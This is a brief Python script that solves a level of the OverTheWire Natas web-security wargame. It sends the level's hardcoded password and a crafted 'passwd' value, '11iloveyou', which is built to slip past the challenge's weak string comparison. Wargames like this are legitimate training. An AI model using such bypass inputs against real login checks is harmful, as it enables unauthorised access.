import requests

# Constants
username = 'natas23'
password = 'qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj'

url = f"http://{username}.natas.labs.overthewire.org/"

session = requests.session()
response = session.post(url, data={"passwd":"11iloveyou"},auth=(username, password))
print(response.text)
